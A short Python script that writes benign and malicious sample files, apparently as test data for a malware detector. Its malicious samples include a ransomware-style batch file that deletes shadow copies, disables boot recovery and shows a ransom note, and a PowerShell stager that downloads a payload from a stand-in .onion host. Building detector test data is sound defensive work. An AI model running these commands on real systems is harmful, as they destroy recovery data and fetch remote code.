"""Generate small benign + malicious test samples for unit tests / demos."""

from __future__ import annotations

import argparse
import os
from pathlib import Path

BENIGN_TEXT = b"This is a perfectly normal text file used for testing.\nNothing malicious here.\n"
BENIGN_PNG = (
    b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
)

MALICIOUS_BAT = b"""@echo off
vssadmin delete shadows /all /quiet
bcdedit /set {default} recoveryenabled No
echo YOUR FILES HAVE BEEN ENCRYPTED. Pay 1 BTC to bc1qexampleexampleexampleexample0000.
"""

MALICIOUS_PS = b"""powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AAo=
$cipher = New-Object Security.Cryptography.AesCryptoServiceProvider
Invoke-WebRequest http://example.onion/payload.exe -OutFile $env:TEMP\\p.exe
"""


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--out", type=Path, default=Path("samples"))
    args = parser.parse_args()
    benign = args.out / "benign"
    malicious = args.out / "malicious"
    benign.mkdir(parents=True, exist_ok=True)
    malicious.mkdir(parents=True, exist_ok=True)

    (benign / "readme.txt").write_bytes(BENIGN_TEXT)
    (benign / "image.png").write_bytes(BENIGN_PNG)
    (malicious / "encryptor.bat").write_bytes(MALICIOUS_BAT)
    (malicious / "stager.ps1").write_bytes(MALICIOUS_PS)
    print(f"Wrote samples under {args.out.resolve()}")


if __name__ == "__main__":
    main()
